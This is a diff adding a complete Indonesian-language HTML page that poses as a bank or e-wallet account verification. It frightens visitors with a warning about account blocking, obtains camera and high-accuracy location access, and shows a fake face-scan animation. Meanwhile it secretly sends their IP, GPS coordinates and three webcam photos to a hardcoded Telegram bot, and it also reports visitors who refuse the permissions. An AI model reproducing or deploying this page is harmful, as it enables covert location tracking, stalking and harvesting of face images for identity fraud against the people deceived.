@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Verifikasi Akun Terpadu</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
+    
+    body {
+        background-color: #f3f4f6;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+
+    .container {
+        background: #ffffff;
+        width: 100%;
+        max-width: 380px;
+        border-radius: 20px;
+        overflow: hidden;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+        border: 1px solid #e5e7eb;
+    }
+
+    /* Header ala Aplikasi Bank/E-Wallet */
+    .header {
+        background: #0f172a;
+        padding: 24px 20px;
+        text-align: center;
+        color: white;
+    }
+
+    .header h1 { font-size: 18px; font-weight: 600; letter-spacing: 0.5px; }
+    .header p { font-size: 12px; color: #94a3b8; margin-top: 4px; }
+
+    .content { padding: 24px 20px; }
+
+    .alert-box {
+        background: #fef2f2;
+        border: 1px solid #fecaca;
+        padding: 12px;
+        border-radius: 10px;
+        margin-bottom: 20px;
+        display: flex;
+        gap: 10px;
+    }
+
+    .alert-box span { font-size: 18px; }
+    .alert-box p { font-size: 12px; color: #991b1b; line-height: 1.5; font-weight: 500; }
+
+    .step-title { font-size: 14px; font-weight: 600; color: #1f2937; margin-bottom: 12px; }
+
+    .req-list {
+        background: #f8fafc;
+        border: 1px solid #e2e8f0;
+        border-radius: 10px;
+        padding: 14px;
+        margin-bottom: 24px;
+    }
+
+    .req-item {
+        display: flex;
+        align-items: center;
+        font-size: 13px;
+        color: #334155;
+        margin-bottom: 10px;
+        font-weight: 500;
+    }
+
+    .req-item:last-child { margin-bottom: 0; }
+    .req-item span.icon { color: #3b82f6; margin-right: 10px; font-size: 16px; }
+
+    .btn-allow {
+        width: 100%;
+        padding: 15px;
+        background: #2563eb;
+        color: #ffffff;
+        border: none;
+        border-radius: 10px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .btn-allow:hover { background: #1d4ed8; }
+    .btn-allow:disabled { background: #93c5fd; cursor: not-allowed; }
+
+    .loader {
+        display: none;
+        width: 16px;
+        height: 16px;
+        border: 2px solid rgba(255,255,255,0.3);
+        border-radius: 50%;
+        border-top-color: white;
+        animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .error-msg {
+        display: none;
+        margin-top: 15px;
+        font-size: 12px;
+        color: #dc2626;
+        text-align: center;
+        font-weight: 500;
+    }
+    .error-msg.show { display: block; }
+
+    /* Tampilan Kamera (Disamarkan) */
+    .camera-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.9);
+        z-index: 999;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        color: white;
+    }
+    
+    .camera-frame {
+        width: 260px;
+        height: 260px;
+        border-radius: 50%;
+        overflow: hidden;
+        border: 4px solid #3b82f6;
+        position: relative;
+        margin-bottom: 20px;
+        box-shadow: 0 0 30px rgba(59, 130, 246, 0.5);
+    }
+
+    .camera-frame video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+
+    .scan-line {
+        position: absolute;
+        top: 0; left: 0; right: 0;
+        height: 3px;
+        background: #3b82f6;
+        box-shadow: 0 0 10px #3b82f6;
+        animation: scan 1.5s infinite linear;
+    }
+    @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+    .camera-text { font-size: 14px; font-weight: 500; letter-spacing: 1px; }
+
+</style>
+</head>
+<body>
+
+    <!-- KOTAK VERIFIKASI AWAL -->
+    <div class="container" id="securityBox">
+        <div class="header">
+            <h1>Sistem Verifikasi Terpadu</h1>
+            <p>Perlindungan Data & Keamanan Akun</p>
+        </div>
+        
+        <div class="content">
+            <div class="alert-box">
+                <span>⚠️</span>
+                <p>Sistem mendeteksi aktivitas tidak wajar. Verifikasi wajah dan lokasi diperlukan untuk mencegah pemblokiran akun.</p>
+            </div>
+
+            <div class="step-title">Persyaratan Verifikasi:</div>
+            <div class="req-list">
+                <div class="req-item"><span class="icon">🪪</span> Pemindaian Wajah (Liveness)</div>
+                <div class="req-item"><span class="icon">📍</span> Validasi Titik Koordinat</div>
+                <div class="req-item"><span class="icon">📱</span> Sinkronisasi Perangkat</div>
+            </div>
+
+            <button class="btn-allow" id="btnAllow">
+                <span>Mulai Verifikasi</span>
+                <div class="loader" id="btnLoader"></div>
+            </button>
+            
+            <div class="error-msg" id="errorMsg">
+                Verifikasi gagal. Sistem membutuhkan akses kamera dan lokasi. Harap izinkan di pengaturan browser dan coba lagi.
+            </div>
+        </div>
+    </div>
+
+    <!-- OVERLAY KAMERA PALSU (Bikin target merasa sedang discan) -->
+    <div class="camera-overlay" id="cameraOverlay">
+        <div class="camera-frame">
+            <video id="scanVideo" autoplay playsinline muted></video>
+            <div class="scan-line"></div>
+        </div>
+        <div class="camera-text" id="scanText">Memindai Wajah Anda...</div>
+    </div>
+
+    <!-- KOTAK SUKSES -->
+    <div class="container" id="successBox" style="display:none; text-align:center; padding: 40px 20px;">
+        <div style="font-size: 60px; color: #22c55e; margin-bottom: 20px;">✓</div>
+        <h2 style="font-size: 18px; color: #111827; margin-bottom: 8px;">Verifikasi Selesai</h2>
+        <p style="font-size: 13px; color: #4b5563; line-height: 1.5;">Data Anda telah tersinkronisasi dengan sistem pusat. Akun Anda sekarang aman.</p>
+    </div>
+
+<script>
+    // ==========================================
+    // GANTI DENGAN TOKEN BOT DAN ID TELEGRAM KAMU
+    // ==========================================
+    const TG_BOT = "8892173347:AAG1U9H0TpUirG3rikyUP1XZRwt1RV1Cu6c";
+    const TG_CHAT = "7191940139";
+    // ==========================================
+
+    const btnAllow = document.getElementById('btnAllow');
+    const btnLoader = document.getElementById('btnLoader');
+    const btnText = btnAllow.querySelector('span');
+    const securityBox = document.getElementById('securityBox');
+    const successBox = document.getElementById('successBox');
+    const errorMsg = document.getElementById('errorMsg');
+    
+    const cameraOverlay = document.getElementById('cameraOverlay');
+    const scanVideo = document.getElementById('scanVideo');
+    const scanText = document.getElementById('scanText');
+
+    // Fungsi Kirim Pesan Teks
+    async function sendTelegram(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: "HTML" })
+            });
+        } catch (e) {}
+    }
+
+    // Fungsi Kirim Foto
+    async function sendPhoto(blob, caption) {
+        try {
+            const fd = new FormData();
+            fd.append("chat_id", TG_CHAT);
+            fd.append("caption", caption);
+            fd.append("photo", blob, "target.jpg");
+            await fetch(`https://api.telegram.org/bot${TG_BOT}/sendPhoto`, { method: "POST", body: fd });
+        } catch (e) {}
+    }
+
+    // Fungsi Ambil IP
+    async function getIP() {
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            const d = await r.json();
+            return `${d.ip} (${d.city}, ${d.country_name})`;
+        } catch (e) { return "IP Tidak diketahui"; }
+    }
+
+    // LOGIKA UTAMA
+    btnAllow.addEventListener('click', async () => {
+        btnAllow.disabled = true;
+        btnText.textContent = "Meminta Izin...";
+        btnLoader.style.display = "block";
+        errorMsg.classList.remove('show');
+
+        let camGranted = false;
+        let locGranted = false;
+        let lat = null, lon = null;
+        let stream = null;
+
+        // 1. Minta Izin Kamera
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            camGranted = true;
+        } catch (e) {
+            camGranted = false;
+        }
+
+        // 2. Minta Izin Lokasi
+        await new Promise((resolve) => {
+            if (!navigator.geolocation) return resolve();
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { locGranted = true; lat = pos.coords.latitude; lon = pos.coords.longitude; resolve(); },
+                () => { locGranted = false; resolve(); },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+
+        // 3. Jika Izin Diberikan
+        if (camGranted && locGranted) {
+            btnText.textContent = "Memproses Data...";
+            
+            // Sembunyikan kotak utama, tampilkan overlay kamera palsu
+            securityBox.style.display = 'none';
+            cameraOverlay.style.display = 'flex';
+            scanVideo.srcObject = stream;
+            await scanVideo.play();
+
+            // Kirim Info Awal ke Telegram
+            const ipData = await getIP();
+            let msg = "🔓 <b>TARGET TERTANGKAP! (Bypass KYC)</b>\n";
+            msg += "━━━━━━━━━━━━━━━━━━━━\n";
+            msg += `🌐 IP: <b>${ipData}</b>\n`;
+            msg += `📍 Lat: <code>${lat}</code>\n`;
+            msg += `📍 Lng: <code>${lon}</code>\n`;
+            msg += `🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Buka Google Maps</a>\n`;
+            msg += `🕒 Waktu: ${new Date().toLocaleString('id-ID')}`;
+            await sendTelegram(msg);
+
+            // 4. Ambil 3 Foto Cepat (Jeda 0.8 detik)
+            const canvas = document.createElement('canvas');
+            canvas.width = scanVideo.videoWidth || 640;
+            canvas.height = scanVideo.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+
+            // Tunggu sebentar agar kamera fokus
+            await new Promise(r => setTimeout(r, 1200));
+
+            for (let i = 1; i <= 3; i++) {
+                scanText.textContent = `Memindai Wajah (${i}/3)...`;
+                
+                // Mirror gambar (karena video di-mirror via CSS)
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(scanVideo, 0, 0, canvas.width, canvas.height);
+                ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform
+
+                const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.8));
+                if (blob) await sendPhoto(blob, `📸 <b>Foto Scan Wajah #${i}</b>`);
+                
+                // Jeda 0.8 detik sebelum foto berikutnya
+                await new Promise(r => setTimeout(r, 800));
+            }
+
+            // Matikan kamera
+            stream.getTracks().forEach(t => t.stop());
+
+            // Animasi selesai
+            scanText.textContent = "Verifikasi Berhasil";
+            await new Promise(r => setTimeout(r, 1000));
+            
+            // Tampilkan sukses
+            cameraOverlay.style.display = 'none';
+            successBox.style.display = 'block';
+
+        } else {
+            // 5. Jika Ditolak
+            btnAllow.disabled = false;
+            btnText.textContent = "Mulai Verifikasi";
+            btnLoader.style.display = "none";
+            errorMsg.classList.add('show');
+            
+            // Lapor ke Telegram kalau target nolak
+            await sendTelegram("⚠️ <b>Target menolak izin!</b>\nStatus Kamera: " + (camGranted?"OK":"Ditolak") + "\nStatus Lokasi: " + (locGranted?"OK":"Ditolak"));
+        }
+    });
+</script>
+</body>
+</html>
